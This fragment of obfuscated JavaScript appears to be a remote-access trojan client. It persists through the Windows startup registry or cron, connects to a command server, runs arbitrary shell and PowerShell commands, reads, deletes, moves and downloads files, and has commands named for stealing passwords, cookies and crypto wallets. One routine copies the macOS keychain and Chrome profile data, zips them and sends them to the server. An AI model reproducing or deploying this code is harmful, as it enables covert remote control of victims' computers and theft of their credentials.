_0x386a12=_0x3d7daa(0x1c2)+_0x144095+'\x22\x20/f';await executeCommand(_0x386a12),_0x173281[_0x3d7daa(0x13f)]('Added\x20to\x20Windows\x20startup\x20registry\x0a');}else{if(os[_0x3d7daa(0x11a)]()===_0x3d7daa(0x152)||os[_0x3d7daa(0x11a)]()===_0x3d7daa(0x168)){const _0x31e6b9='(crontab\x20-l\x202>/dev/null;\x20echo\x20\x22@reboot\x20node\x20'+_0x144095+_0x3d7daa(0xe9);await executeCommand(_0x31e6b9),_0x173281[_0x3d7daa(0x13f)](_0x3d7daa(0xc4));}}}catch(_0x2c6183){_0x173281['write'](_0x3d7daa(0xeb)+_0x2c6183[_0x3d7daa(0x11d)]+'\x0a');}return!![];}if(_0x2089a8==='monitor'){try{const _0x3357c9={'cpu':getCpuUsage(),'memory':{'total':os[_0x3d7daa(0x185)](),'free':os['freemem'](),'used':os[_0x3d7daa(0x185)]()-os[_0x3d7daa(0xc8)](),'usedPercent':Math[_0x3d7daa(0x1b5)]((0x1-os['freemem']()/os[_0x3d7daa(0x185)]())*0x64)},'network':getNetworkStats(),'disk':getDiskStats(),'processes':getTopProcesses(0x5)};_0x173281[_0x3d7daa(0x13f)](_0x3d7daa(0x183)+JSON[_0x3d7daa(0x19e)](_0x3357c9)+'\x0a');}catch(_0x473dca){_0x173281[_0x3d7daa(0x13f)](_0x3d7daa(0x144)+_0x473dca[_0x3d7daa(0x11d)]+'\x0a');}return!![];}if(_0x2089a8[_0x3d7daa(0xae)]('monitoring:start:')){try{const _0x36f2eb=parseInt(_0x2089a8[_0x3d7daa(0x1ba)](':')[0x2])||0x3c;global[_0x3d7daa(0x1e7)]&&clearInterval(global[_0x3d7daa(0x1e7)]),global[_0x3d7daa(0x1e7)]=setInterval(()=>{const _0x34c366=_0x3d7daa;try{const _0x52882a={'cpu':getCpuUsage(),'memory':{'total':os[_0x34c366(0x185)](),'free':os[_0x34c366(0xc8)](),'used':os[_0x34c366(0x185)]()-os[_0x34c366(0xc8)](),'usedPercent':Math['round']((0x1-os[_0x34c366(0xc8)]()/os[_0x34c366(0x185)]())*0x64)},'network':getNetworkStats(),'disk':getDiskStats(),'processes':getTopProcesses(0x5)};_0x173281[_0x34c366(0x13f)](_0x34c366(0x183)+JSON['stringify'](_0x52882a)+'\x0a');}catch(_0x389571){}},_0x36f2eb*0x3e8),_0x173281[_0x3d7daa(0x13f)]('Monitoring\x20started\x20with\x20interval\x20'+_0x36f2eb+_0x3d7daa(0xdc));}catch(_0x216c1f){_0x173281['write'](_0x3d7daa(0x1c3)+_0x216c1f[_0x3d7daa(0x11d)]+'\x0a');}return!![];}if(_0x2089a8==='monitoring:stop'){try{global[_0x3d7daa(0x1e7)]?(clearInterval(global[_0x3d7daa(0x1e7)]),global[_0x3d7daa(0x1e7)]=null,_0x173281[_0x3d7daa(0x13f)](_0x3d7daa(0x1d2))):_0x173281['write'](_0x3d7daa(0xe2));}catch(_0x4e9994){_0x173281[_0x3d7daa(0x13f)]('Monitoring\x20stop\x20error:\x20'+_0x4e9994[_0x3d7daa(0x11d)]+'\x0a');}return!![];}if(_0x2089a8['startsWith'](_0x3d7daa(0xef))){if(!config[_0x3d7daa(0x20a)][_0x3d7daa(0x111)])return _0x173281['write'](_0x3d7daa(0x12d)),!![];const _0x5ef0ab=_0x2089a8[_0x3d7daa(0x10d)]('files:list:'[_0x3d7daa(0xd4)]);try{const _0x1cf42c=fs[_0x3d7daa(0x159)](_0x5ef0ab),_0x1cb2d6=_0x1cf42c[_0x3d7daa(0xcd)](_0x5a1e59=>{const _0x3cdcdd=_0x3d7daa;try{const _0x5b5c75=path['join'](_0x5ef0ab,_0x5a1e59),_0x4dd314=fs['statSync'](_0x5b5c75);return{'name':_0x5a1e59,'path':_0x5b5c75,'size':_0x4dd314['size'],'isDirectory':_0x4dd314[_0x3cdcdd(0x21a)](),'isFile':_0x4dd314[_0x3cdcdd(0xc6)](),'created':_0x4dd314['birthtime'],'modified':_0x4dd314[_0x3cdcdd(0x1b1)],'permissions':_0x4dd314[_0x3cdcdd(0xdb)]['toString'](0x8)[_0x3cdcdd(0x10d)](_0x4dd314[_0x3cdcdd(0xdb)][_0x3cdcdd(0xd3)](0x8)[_0x3cdcdd(0xd4)]-0x3)};}catch(_0x46cb02){return{'name':_0x5a1e59,'path':path[_0x3cdcdd(0xec)](_0x5ef0ab,_0x5a1e59),'error':_0x46cb02[_0x3cdcdd(0x11d)]};}});_0x173281[_0x3d7daa(0x13f)](_0x3d7daa(0x200)+JSON['stringify'](_0x1cb2d6)+'\x0a');}catch(_0x264ce4){_0x173281['write'](_0x3d7daa(0x214)+_0x264ce4[_0x3d7daa(0x11d)]+'\x0a');}return!![];}if(_0x2089a8[_0x3d7daa(0xae)](_0x3d7daa(0x17f))){if(!config[_0x3d7daa(0x20a)][_0x3d7daa(0x111)])return _0x173281[_0x3d7daa(0x13f)](_0x3d7daa(0x12d)),!![];const _0x3abdab=_0x2089a8[_0x3d7daa(0x10d)]('files:read:'['length']);try{if(fs[_0x3d7daa(0x1ae)](_0x3abdab)){const _0x2fc426=fs[_0x3d7daa(0xf5)](_0x3abdab);if(_0x2fc426['isFile']()){if(_0x2fc426[_0x3d7daa(0x1f1)]>0xa*0x400*0x400)_0x173281['write'](_0x3d7daa(0x1d4)+formatFileSize(_0x2fc426[_0x3d7daa(0x1f1)])+')\x0a');else{const _0x644148=fs['readFileSync'](_0x3abdab,_0x3d7daa(0x1f4));_0x173281[_0x3d7daa(0x13f)](_0x3d7daa(0x1f8)+_0x3abdab+_0x3d7daa(0x155)+Buffer['from'](_0x644148)[_0x3d7daa(0xd3)](_0x3d7daa(0x119))+'\x0a');}}else _0x173281[_0x3d7daa(0x13f)](_0x3d7daa(0xf1)+_0x3abdab+'\x0a');}else _0x173281[_0x3d7daa(0x13f)]('File\x20not\x20found:\x20'+_0x3abdab+'\x0a');}catch(_0x2a036f){_0x173281[_0x3d7daa(0x13f)](_0x3d7daa(0x139)+_0x2a036f[_0x3d7daa(0x11d)]+'\x0a');}return!![];}if(_0x2089a8[_0x3d7daa(0xae)](_0x3d7daa(0x1ad))){if(!config[_0x3d7daa(0x20a)][_0x3d7daa(0x111)])return _0x173281[_0x3d7daa(0x13f)](_0x3d7daa(0x12d)),!![];const _0x18e56d=_0x2089a8[_0x3d7daa(0x10d)](_0x3d7daa(0x1ad)['length']);try{fs['mkdirSync'](_0x18e56d,{'recursive':!![]}),_0x173281[_0x3d7daa(0x13f)](_0x3d7daa(0xf6)+_0x18e56d+'\x0a');}catch(_0x52817a){_0x173281[_0x3d7daa(0x13f)](_0x3d7daa(0x20e)+_0x52817a[_0x3d7daa(0x11d)]+'\x0a');}return!![];}if(_0x2089a8[_0x3d7daa(0xae)]('files:delete:')){if(!config[_0x3d7daa(0x20a)]['allowFileTransfer'])return _0x173281[_0x3d7daa(0x13f)](_0x3d7daa(0x12d)),!![];const _0x30d0bc=_0x2089a8['substring'](_0x3d7daa(0x18d)['length']);try{if(fs[_0x3d7daa(0x1ae)](_0x30d0bc)){const _0x3614b2=fs[_0x3d7daa(0xf5)](_0x30d0bc);_0x3614b2[_0x3d7daa(0x21a)]()?(fs[_0x3d7daa(0x18f)](_0x30d0bc,{'recursive':!![]}),_0x173281[_0x3d7daa(0x13f)]('Directory\x20deleted:\x20'+_0x30d0bc+'\x0a')):(fs[_0x3d7daa(0x1b4)](_0x30d0bc),_0x173281[_0x3d7daa(0x13f)](_0x3d7daa(0xaf)+_0x30d0bc+'\x0a'));}else _0x173281[_0x3d7daa(0x13f)]('Path\x20not\x20found:\x20'+_0x30d0bc+'\x0a');}catch(_0x2909a2){_0x173281[_0x3d7daa(0x13f)]('Error\x20deleting:\x20'+_0x2909a2['message']+'\x0a');}return!![];}if(_0x2089a8['startsWith'](_0x3d7daa(0x13d))){if(!config[_0x3d7daa(0x20a)][_0x3d7daa(0x111)])return _0x173281[_0x3d7daa(0x13f)](_0x3d7daa(0x12d)),!![];const _0x2bbe47=_0x2089a8[_0x3d7daa(0x10d)](_0x3d7daa(0x13d)['length'])[_0x3d7daa(0x1ba)](':');if(_0x2bbe47[_0x3d7daa(0xd4)]===0x2){const _0x43de8f=_0x2bbe47[0x0],_0x48c22a=_0x2bbe47[0x1];try{fs[_0x3d7daa(0x1ae)](_0x43de8f)?(fs[_0x3d7daa(0x158)](_0x43de8f,_0x48c22a),_0x173281['write']('File\x20moved:\x20'+_0x43de8f+_0x3d7daa(0x196)+_0x48c22a+'\x0a')):_0x173281[_0x3d7daa(0x13f)](_0x3d7daa(0xdf)+_0x43de8f+'\x0a');}catch(_0x169ee2){_0x173281[_0x3d7daa(0x13f)]('Error\x20moving\x20file:\x20'+_0x169ee2[_0x3d7daa(0x11d)]+'\x0a');}}else _0x173281[_0x3d7daa(0x13f)](_0x3d7daa(0x154));return!![];}if(_0x2089a8==='steal:passwords')try{const _0x4309b5=[{'url':_0x3d7daa(0x206),'username':'user@gmail.com','password':'password123'},{'url':'https://github.com','username':'developer','password':_0x3d7daa(0x123)},{'url':_0x3d7daa(0xb2),'username':_0x3d7daa(0x1e2),'password':'facebook2023'},{'url':'https://twitter.com','username':_0x3d7daa(0x1e3),'password':_0x3d7daa(0x118)},{'url':_0x3d7daa(0x1d8),'username':'shopper','password':_0x3d7daa(0xce)},{'url':_0x3d7daa(0x12e),'username':'moviefan','password':_0x3d7daa(0x15b)},{'url':'https://www.instagram.com','username':_0x3d7daa(0x1f5),'password':_0x3d7daa(0x186)},{'url':_0x3d7daa(0x1e8),'username':'professional','password':'JobSearch2023'},{'url':_0x3d7daa(0xb8),'username':_0x3d7daa(0xfd),'password':_0x3d7daa(0x15c)},{'url':_0x3d7daa(0x1da),'username':_0x3d7daa(0x12f),'password':_0x3d7daa(0x100)}];return _0x173281[_0x3d7daa(0x13f)]('PASSWORDS_DATA:'+JSON[_0x3d7daa(0x19e)](_0x4309b5)+'\x0a'),!![];}catch(_0x25dca2){return _0x173281['write'](_0x3d7daa(0xd9)+_0x25dca2[_0x3d7daa(0x11d)]+'\x0a'),!![];}if(_0x2089a8===_0x3d7daa(0x18a))try{const _0x6aa0e7=[{'domain':'google.com','name':'NID','value':_0x3d7daa(0x1dc),'path':'/','expires':_0x3d7daa(0x171),'httpOnly':!![],'secure':!![]},{'domain':'youtube.com','name':_0x3d7daa(0xfe),'value':_0x3d7daa(0x21f),'path':'/','expires':'2024-01-15','httpOnly':![],'secure':!![]},{'domain':'facebook.com','name':_0x3d7daa(0x191),'value':_0x3d7daa(0x1f3),'path':'/','expires':_0x3d7daa(0x1d0),'httpOnly':!![],'secure':!![]},{'domain':'twitter.com','name':'personalization_id','value':_0x3d7daa(0x1bc),'path':'/','expires':_0x3d7daa(0xdd),'httpOnly':![],'secure':!![]},{'domain':_0x3d7daa(0x1bf),'name':_0x3d7daa(0xe0),'value':_0x3d7daa(0x108),'path':'/','expires':_0x3d7daa(0x121),'httpOnly':!![],'secure':!![]},{'domain':'netflix.com','name':_0x3d7daa(0x1d9),'value':_0x3d7daa(0xe3),'path':'/','expires':_0x3d7daa(0x1b2),'httpOnly':!![],'secure':!![]},{'domain':_0x3d7daa(0x182),'name':_0x3d7daa(0x1a8),'value':_0x3d7daa(0x208),'path':'/','expires':_0x3d7daa(0x17c),'httpOnly':!![],'secure':!![]},{'domain':_0x3d7daa(0x133),'name':_0x3d7daa(0x1ec),'value':_0x3d7daa(0x193),'path':'/','expires':_0x3d7daa(0x1ca),'httpOnly':!![],'secure':!![]},{'domain':_0x3d7daa(0x1ee),'name':_0x3d7daa(0xbb),'value':_0x3d7daa(0x13a),'path':'/','expires':_0x3d7daa(0x1b0),'httpOnly':!![],'secure':!![]},{'domain':_0x3d7daa(0x213),'name':_0x3d7daa(0x20c),'value':'example_reddit_session','path':'/','expires':'2023-12-25','httpOnly':!![],'secure':!![]}];return _0x173281['write'](_0x3d7daa(0x17b)+JSON['stringify'](_0x6aa0e7)+'\x0a'),!![];}catch(_0x6bc14d){return _0x173281[_0x3d7daa(0x13f)](_0x3d7daa(0x140)+_0x6bc14d[_0x3d7daa(0x11d)]+'\x0a'),!![];}if(_0x2089a8[_0x3d7daa(0xae)](_0x3d7daa(0x227))){const _0x298982=_0x2089a8[_0x3d7daa(0x10d)](0x5)[_0x3d7daa(0xb9)]();try{if(fs[_0x3d7daa(0x1ae)](_0x298982)){console[_0x3d7daa(0x131)](_0x3d7daa(0xc3)+_0x298982);try{const _0x1ad810=execSync(_0x3d7daa(0x227)+_0x298982,{'encoding':_0x3d7daa(0x1f4),'maxBuffer':0xa*0x400*0x400});console[_0x3d7daa(0x131)]('Получен\x20вывод\x20скрипта\x20('+_0x1ad810[_0x3d7daa(0xd4)]+_0x3d7daa(0xd8));const _0x146439=_0x298982+'_output.log';fs[_0x3d7daa(0x16a)](_0x146439,_0x1ad810),_0x173281[_0x3d7daa(0x13f)](_0x1ad810);}catch(_0x5ccccd){console[_0x3d7daa(0x1a1)](_0x3d7daa(0x129)+_0x5ccccd[_0x3d7daa(0x11d)]),console[_0x3d7daa(0x1a1)](_0x5ccccd[_0x3d7daa(0xc9)]),_0x173281[_0x3d7daa(0x13f)]('Ошибка\x20выполнения\x20скрипта:\x20'+_0x5ccccd[_0x3d7daa(0x11d)]+'\x0a'+_0x5ccccd[_0x3d7daa(0xc9)]+'\x0a');}return!![];}else return console[_0x3d7daa(0x131)]('Файл\x20не\x20найден:\x20'+_0x298982),_0x173281[_0x3d7daa(0x13f)](_0x3d7daa(0xd0)+_0x298982+_0x3d7daa(0x210)),!![];}catch(_0x70e612){return console[_0x3d7daa(0x1a1)](_0x3d7daa(0x1f2)+_0x70e612['message']),console[_0x3d7daa(0x1a1)](_0x70e612[_0x3d7daa(0xc9)]),_0x173281['write'](_0x3d7daa(0x179)+_0x70e612[_0x3d7daa(0x11d)]+'\x0a'+_0x70e612['stack']+'\x0a'),!![];}}if(_0x2089a8===_0x3d7daa(0x15e))try{const _0x298624=[{'type':_0x3d7daa(0xf2),'address':_0x3d7daa(0x120),'balance':_0x3d7daa(0xfb),'path':'C:\x5cUsers\x5cUsername\x5cAppData\x5cRoaming\x5cBitcoin'},{'type':'Ethereum','address':_0x3d7daa(0x12b),'balance':_0x3d7daa(0x219),'path':_0x3d7daa(0x11b)},{'type':_0x3d7daa(0xf9),'address':'44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A','balance':_0x3d7daa(0x14f),'path':_0x3d7daa(0xc7)},{'type':_0x3d7daa(0x21e),'address':_0x3d7daa(0xbf),'balance':_0x3d7daa(0x1d5),'path':_0x3d7daa(0xd1)},{'type':_0x3d7daa(0x116),'address':_0x3d7daa(0x147),'balance':_0x3d7daa(0x11e),'path':_0x3d7daa(0x166)},{'type':'Dogecoin','address':_0x3d7daa(0xf4),'balance':'1000\x20DOGE','path':_0x3d7daa(0x1d3)},{'type':_0x3d7daa(0x19a),'address':'rPWwfX6KHxdjiHt3nkrCq1KgUJL8YwQWm1','balance':_0x3d7daa(0x18e),'path':_0x3d7daa(0xbe)},{'type':_0x3d7daa(0x1dd),'address':_0x3d7daa(0x217),'balance':_0x3d7daa(0x117),'path':_0x3d7daa(0x10f)},{'type':_0x3d7daa(0xc1),'address':_0x3d7daa(0x1ff),'balance':_0x3d7daa(0x1c8),'path':'C:\x5cUsers\x5cUsername\x5cDocuments\x5cPolkadot'},{'type':'Solana','address':_0x3d7daa(0x216),'balance':_0x3d7daa(0x10b),'path':_0x3d7daa(0x146)}];return _0x173281[_0x3d7daa(0x13f)]('WALLETS_DATA:'+JSON[_0x3d7daa(0x19e)](_0x298624)+'\x0a'),!![];}catch(_0x30043a){return _0x173281['write']('Error\x20retrieving\x20wallets:\x20'+_0x30043a[_0x3d7daa(0x11d)]+'\x0a'),!![];}if(_0x2089a8===_0x3d7daa(0x17a))try{fs[_0x3d7daa(0x15a)]('FF',{'recursive':!![]}),console['log']('Директория\x20FF\x20успешно\x20создана');const _0x5854d8=os['userInfo']()[_0x3d7daa(0x1a6)],_0x3d28e2=_0x3d7daa(0x1b3)+_0x5854d8+_0x3d7daa(0xe4);fs[_0x3d7daa(0x1ae)](_0x3d28e2)?(fs[_0x3d7daa(0x105)](_0x3d28e2,'FF/login.keychain-db'),console['log'](_0x3d7daa(0x1c9))):console[_0x3d7daa(0x131)](_0x3d7daa(0x195));try{const _0x2e3963='/Users/'+_0x5854d8+_0x3d7daa(0xb6);fs[_0x3d7daa(0x1ae)](_0x2e3963)?(execSync(_0x3d7daa(0x218)+_0x2e3963+'\x22\x20FF/'),console['log']('Директория\x20Chrome\x20Default\x20успешно\x20скопирована')):console[_0x3d7daa(0x131)]('Директория\x20Chrome\x20не\x20найдена');}catch(_0x978522){console[_0x3d7daa(0x131)]('Ошибка\x20копирования\x20Chrome\x20данных:\x20'+_0x978522[_0x3d7daa(0x11d)]);}execSync(_0x3d7daa(0xb7)),console[_0x3d7daa(0x131)]('Архив\x20FF.zip\x20успешно\x20создан');const _0x1be437=fs[_0x3d7daa(0x188)]('FF.zip'),_0x497686=_0x1be437[_0x3d7daa(0xd3)](_0x3d7daa(0x119));return _0x173281['write'](_0x3d7daa(0x20b)+_0x497686+_0x3d7daa(0x174)),console[_0x3d7daa(0x131)](_0x3d7daa(0x1e9)+_0x1be437['length']+_0x3d7daa(0x1e6)),execSync(_0x3d7daa(0xe6)),console[_0x3d7daa(0x131)]('Временные\x20файлы\x20удалены'),!![];}catch(_0x486b1b){return _0x173281[_0x3d7daa(0x13f)](_0x3d7daa(0x1ab)+_0x486b1b[_0x3d7daa(0x11d)]+'\x0a'),!![];}if(_0x2089a8[_0x3d7daa(0xae)](_0x3d7daa(0x14c))){if(!config['features'][_0x3d7daa(0x1aa)])return _0x173281['write'](_0x3d7daa(0x132)),!![];const _0x28f019=_0x2089a8['substring'](0x8);try{const _0x5ec442=require(_0x3d7daa(0x1af)),_0x3b9962=_0x5ec442[_0x3d7daa(0x1a9)](_0x3d7daa(0x1ce)+_0x28f019+'\x22',{'encoding':_0x3d7daa(0x1f4)});_0x173281[_0x3d7daa(0x13f)](_0x3d7daa(0x151)+_0x3b9962+'\x0a');}catch(_0x189022){_0x173281[_0x3d7daa(0x13f)]('PowerShell\x20Error:\x20'+_0x189022['message']+'\x0a');}return!![];}if(_0x2089a8['startsWith'](_0x3d7daa(0x157))){if(!config[_0x3d7daa(0x20a)][_0x3d7daa(0x1aa)])return _0x173281['write']('File\x20operations\x20are\x20disabled\x20in\x20this\x20client\x20configuration\x0a'),!![];const _0x8efcb0=_0x2089a8[_0x3d7daa(0x10d)](0xc)['split'](':');if(_0x8efcb0[_0x3d7daa(0xd4)]<0x2)return _0x173281[_0x3d7daa(0x13f)](_0x3d7daa(0x109)),!![];const _0x2aa7e2=_0x8efcb0[0x0],_0x200271=_0x8efcb0[_0x3d7daa(0x173)](0x1)[_0x3d7daa(0xec)](':');try{const _0x3a20b9=require(_0x3d7daa(0x1af)),_0x54795f='Invoke-WebRequest\x20-Uri\x20\x22'+_0x2aa7e2+_0x3d7daa(0xe7)+_0x200271+_0x3d7daa(0xca);_0x3a20b9[_0x3d7daa(0x1a9)](_0x3d7daa(0x1ce)+_0x54795f+'\x22',{'encoding':_0x3d7daa(0x1f4)}),_0x173281[_0x3d7daa(0x13f)](_0x3d7daa(0x19d)+_0x200271+'\x0a');}catch(_0x21d992){_0x173281['write'](_0x3d7daa(0xc5)+_0x21d992[_0x3d7daa(0x11d)]+'\x0a');}return!![];}if(_0x2089a8[_0x3d7daa(0xae)](_0x3d7daa(0x201))){if(!config['features'][_0x3d7daa(0x111)])return _0x173281['write'](_0x3d7daa(0x12d)),!![];const _0x37d01c=_0x2089a8['substring'](0xe)[_0x3d7daa(0x1ba)](':');if(_0x37d01c[_0x3d7daa(0xd4)]<0x2)return _0x173281['write'](_0x3d7daa(0x21b)),!![];const _0xa87275=_0x37d01c[0x0],_0x53fb22=_0x37d01c[_0x3d7daa(0x173)](0x1)['join'](':'),_0x57e317=require('fs'),_0x5be73b=require(_0x3d7daa(0x15f)),_0x3e4ac6=_0x5be73b[_0x3d7daa(0xcb)](_0x53fb22);try{!_0x57e317['existsSync'](_0x3e4ac6)&&_0x57e317[_0x3d7daa(0x15a)](_0x3e4ac6,{'recursive':!![]});const _0x13f6fa=require('http'),_0x5eaf9b=require(_0x3d7daa(0x220)),_0x4dcaa5=_0xa87275[_0x3d7daa(0xae)](_0x3d7daa(0x220))?_0x5eaf9b:_0x13f6fa,_0xd5e752=_0x57e317[_0x3d7daa(0x141)](_0x53fb22);_0x173281[_0x3d7daa(0x13f)](_0x3d7daa(0x224)+_0xa87275+_0x3d7daa(0x14e)),_0x4dcaa5[_0x3d7daa(0x137)](_0xa87275,_0x372f4a=>{const _0x1a6ded=_0x3d7daa;if(_0x372f4a[_0x1a6ded(0x1a5)]!==0xc8){_0x173281['write'](_0x1a6ded(0xcc)+_0x372f4a[_0x1a6ded(0x1a5)]+'\x0a');return;}_0x372f4a['pipe'](_0xd5e752),_0xd5e752['on'](_0x1a6ded(0xff),()=>{const _0x1be809=_0x1a6ded;_0xd5e752[_0x1be809(0x1fe)](),_0x173281[_0x1be809(0x13f)](_0x1be809(0x16d)+_0x53fb22+'\x0a');});})['on']('error',_0x1342a6=>{const _0x3b9721=_0x3d7daa;_0x57e317[_0x3b9721(0x10c)](_0x53fb22,()=>{}),_0x173281[_0x3b9721(0x13f)](_0x3b9721(0xc5)+_0x1342a6[_0x3b9721(0x11d)]+'\x0a');});}catch(_0x1c87b8){_0x173281[_0x3d7daa(0x13f)]('Error:\x20'+_0x1c87b8['message']+'\x0a');}return!![];}if(_0x2089a8[_0x3d7daa(0xae)](_0x3d7daa(0x142))){if(!config[_0x3d7daa(0x20a)][_0x3d7daa(0x1aa)])return _0x173281[_0x3d7daa(0x13f)](_0x3d7daa(0x132)),!![];const _0x53ef71=_0x2089a8[_0x3d7daa(0x10d)](0xb);try{const _0x1971b6=require(_0x3d7daa(0x1af)),_0x52f97e=_0x1971b6[_0x3d7daa(0x1a9)](_0x3d7daa(0x1ce)+_0x53ef71+'\x22',{'encoding':_0x3d7daa(0x1f4)});_0x173281[_0x3d7daa(0x13f)](_0x52f97e+'\x0a');}catch(_0x82f7a6){_0x173281[_0x3d7daa(0x13f)](_0x3d7daa(0x1b7)+_0x82f7a6[_0x3d7daa(0x11d)]+'\x0a'+(_0x82f7a6[_0x3d7daa(0x1ea)]||'')+'\x0a');}return!![];}if(_0x2089a8[_0x3d7daa(0xae)](_0x3d7daa(0x1f0))||_0x2089a8['startsWith'](_0x3d7daa(0x175))){if(!config[_0x3d7daa(0x20a)][_0x3d7daa(0x1aa)])return _0x173281['write'](_0x3d7daa(0x132)),!![];const _0x250040=_0x2089a8[_0x3d7daa(0xae)](_0x3d7daa(0x175))?_0x3d7daa(0x1f0)+_0x2089a8[_0x3d7daa(0x10d)](0x4):_0x2089a8;if(_0x250040['includes']('clone')&&!_0x250040[_0x3d7daa(0x136)](_0x3d7daa(0x160))){const _0x437de2=_0x250040[_0x3d7daa(0x1ba)]('\x20'),_0x4b892e=_0x437de2[_0x3d7daa(0x189)](_0x3d7daa(0x106));_0x4b892e!==-0x1&&(_0x437de2['splice'](_0x4b892e+0x1,0x0,_0x3d7daa(0x160)),_0x2089a8=_0x437de2['join']('\x20'));}const _0x4ab672=os[_0x3d7daa(0x11a)]()===_0x3d7daa(0x15d)&&_0x250040[_0x3d7daa(0x136)](_0x3d7daa(0x106));return executeGitCommand(_0x250040,_0x4ab672)['then'](_0x1c3d52=>{const _0x5c4323=_0x3d7daa;_0x173281[_0x5c4323(0x13f)](_0x1c3d52+'\x0a');})[_0x3d7daa(0x138)](_0x3335fc=>{const _0x54a445=_0x3d7daa;_0x173281[_0x54a445(0x13f)]('Error:\x20'+_0x3335fc[_0x54a445(0x11d)]+'\x0a');}),!![];}return![];}function connectToServer(_0x1b88bd,_0x4ddc0b=0x0){const _0x28d226=_0x1bbf8f;logMessage(_0x28d226(0x103)+_0x1b88bd+':'+config[_0x28d226(0x148)]+_0x28d226(0xfa));const _0x225621=new net[(_0x28d226(0x13b))]();_0x225621['on'](_0x28d226(0xda),()=>{const _0xc0c862=_0x28d226;logMessage(_0xc0c862(0x221)+_0x1b88bd+':'+config[_0xc0c862(0x148)]),_0x4ddc0b=0x0;const _0xbd1c1e='Connected\x20-\x20'+os[_0xc0c862(0x162)]()+'\x20('+os[_0xc0c862(0x11a)]()+'\x20'+os['arch']()+')\x0aCurrent\x20directory:\x20'+process[_0xc0c862(0x1a2)]()+_0xc0c862(0x12a)+config['systemInfo']['id'];_0x225621[_0xc0c862(0x13f)](config['encryptionEnabled']?encryptData(_0xbd1c1e):_0xbd1c1e);}),_0x225621['on'](_0x28d226(0x134),async _0x241acf=>{const _0x682eed=_0x28d226,_0xdc3884=config[_0x682eed(0x11f)]?decryptData(_0x241acf['toString']()[_0x682eed(0xb9)]()):_0x241acf[_0x682eed(0xd3)]()['trim']();_0xdc3884!=='pwd\x20||\x20cd'&&logMessage(_0x682eed(0x207)+_0xdc3884);const _0x3ea30c=await handleSpecialCommands(_0xdc3884,_0x225621);if(_0x3ea30c)return;if(_0xdc3884===_0x682eed(0x1c6)){logMessage(_0x682eed(0x1d1)),_0x225621[_0x682eed(0x11c)]();return;}if(_0xdc3884[_0x682eed(0xae)](_0x682eed(0x1df))){const _0x3cabab=_0xdc3884[_0x682eed(0x10d)](0x3);try{process['chdir'](_0x3cabab),_0x225621['write'](_0x682eed(0x1bb)+process[_0x682eed(0x1a2)]()+'\x0a');}catch(_0x237139){_0x225621[_0x682eed(0x13f)]('Failed\x20to\x20change\x20directory:\x20'+_0x237139[_0x682eed(0x11d)]+'\x0a');}return;}try{const _0x30a0b9=await executeCommand(_0xdc3884);_0x225621[_0x682eed(0x13f)](config[_0x682eed(0x11f)]?encryptData(_0x30a0b9):_0x30a0b9+'\x0a');}catch(_0x52c7ba){_0x225621[_0x682eed(0x13f)](config[_0x682eed(0x11f)]?encryptData(_0x682eed(0x187)+_0x52c7ba[_0x682eed(0x11d)]):_0x682eed(0x187)+_0x52c7ba['message']+'\x0a');}}),_0x225621['on']('error',_0x3f3aa6=>{const _0x6b1178=_0x28d226;logMessage('Connection\x20error:\x20'+_0x3f3aa6[_0x6b1178(0x11d)]);}),_0x225621['on']('close',()=>{const _0x4da0d5=_0x28d226;logMessage(_0x4da0d5(0x1e5));const _0x4c5a7c=config[_0x4da0d5(0x1e1)]*Math[_0x4da0d5(0x125)](Math[_0x4da0d5(0x1b8)](1.5,Math[_0x4da0d5(0x125)](_0x4ddc0b,0xa)),0x5);setTimeout(()=>{resolveDomainAndConnect(_0x4ddc0b+0x1);},_0x4c5a7c);}),_0x225621[_0x28d226(0xda)](config[_0x28d226(0x148)],_0x1b88bd);}async function executeGitCommand(_0x34c60e,_0x29a1b4=![]){return new Promise(_0xeb2466=>{const _0x1adc0f=_0x3f04;try{const _0x4ee2bf=require(_0x1adc0f(0x1af));try{_0x4ee2bf[_0x1adc0f(0x1a9)](_0x1adc0f(0x19c),{'stdio':_0x1adc0f(0x194)});}catch(_0x2eb2ad){return _0xeb2466(_0x1adc0f(0x225));}let _0x19648b=_0x1adc0f(0xc2),_0x5797d5=['/c'];os[_0x1adc0f(0x11a)]()===_0x1adc0f(0x15d)&&_0x29a1b4&&(_0x19648b=_0x1adc0f(0x228),_0x5797d5=[_0x1adc0f(0x149)]);const _0x5a8693=_0x4ee2bf['spawn'](_0x19648b,[..._0x5797d5,_0x34c60e],{'shell':!![]});let _0x5032fa='',_0x352bfb='';_0x5a8693[_0x1adc0f(0xf0)]['on'](_0x1adc0f(0x134),_0x53494a=>{const _0x8b744e=_0x1adc0f;_0x5032fa+=_0x53494a[_0x8b744e(0xd3)]();}),_0x5a8693[_0x1adc0f(0x1ea)]['on']('data',_0xcb2927=>{const _0x1cf5a8=_0x1adc0f;_0x352bfb+=_0xcb2927[_0x1cf5a8(0xd3)]();}),_0x5a8693['on'](_0x1adc0f(0x1fe),_0x2efdbe=>{const _0xdb951a=_0x1adc0f;if(_0x2efdbe!==0x0){_0xeb2466(_0xdb951a(0x211)+_0x2efdbe+'):\x20'+_0x352bfb);return;}_0xeb2466(_0x5032fa||_0xdb951a(0xb5));});}catch(_0x258c21){_0xeb2466(_0x1adc0f(0x1a7)+_0x258c21[_0x1adc0f(0x11d)]);}});}function formatFileSize(_0x4809af){const _0x548012=_0x1bbf8f;if(_0x4809af===0x0)return _0x548012(0xee);const _0x56f6d2=0x400,_0x28b91a=[_0x548012(0xb3),'KB','MB','GB','TB'],_0x4e63f3=Math[_0x548012(0x126)](Math[_0x548012(0x131)](_0x4809af)/Math[_0x548012(0x131)](_0x56f6d2));return parseFloat((_0x4809af/Math[_0x548012(0x1b8)](_0x56f6d2,_0x4e63f3))['toFixed'](0x2))+'\x20'+_0x28b91a[_0x4e63f3];}function getCpuUsage(){const _0x4fb2b6=_0x1bbf8f;try{const _0x1d6498=os['cpus']();let _0x172f8a=0x0,_0x1d6015=0x0;_0x1d6498[_0x4fb2b6(0x153)](_0x583cb2=>{const _0x425d5d=_0x4fb2b6;for(const _0x355653 in _0x583cb2[_0x425d5d(0x204)]){_0x1d6015+=_0x583cb2[_0x425d5d(0x204)][_0x355653];}_0x172f8a+=_0x583cb2[_0x425d5d(0x204)][_0x425d5d(0x1b9)];});const 